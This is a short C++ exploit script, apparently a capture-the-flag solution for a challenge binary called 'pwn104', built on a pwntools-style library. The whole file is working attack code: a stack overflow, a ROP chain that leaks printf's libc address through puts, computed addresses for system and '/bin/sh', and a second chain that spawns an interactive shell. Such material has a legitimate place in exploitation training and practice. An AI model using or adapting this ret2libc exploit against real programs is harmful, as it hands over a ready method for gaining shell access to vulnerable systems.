//exp104rop
#include <string>
#include <iostream>
#include <pwntools>

int main(){
using namespace pwn;
ELF libc{"/lib/x86_64-linux-gnu/libc.so.6"};
int64_t libc_offset1=libc["_IO_printf"]-libc["system"];
int64_t libc_offset2=0x196031-libc["_IO_printf"];
Process p{"./pwn104",NULL,0};
p.set_debug(true);
p.recv(1024);
std::string rop0;
for(int i=0;i<(int)0x58;i++) rop0.append(hex2string(0x90));
rop0 +=p64(0x4012ab);
rop0 +=p64(0x404020);
rop0 +=p64(0x401030); //.plt puts
rop0 +=p64(0x4011cd); //main
p.sendline(rop0);
std::string tmp=p.recv(6);
std::reverse(tmp.begin(),tmp.end());
long libc_printf=str2long(tmp);
long libc_system=libc_printf-libc_offset1;
long libc_str_bin_sh=libc_printf+libc_offset2;
std::string rop1;
for(int i=0;i<(int)0x58;i++) rop1.append(hex2string(0x90));
rop1 +=p64(0x4012ab);
rop1 +=p64(libc_str_bin_sh);
rop1 +=p64(0x401016); //ret
rop1 +=p64(libc_system);
p.sendline(rop1);
p.interactive();
}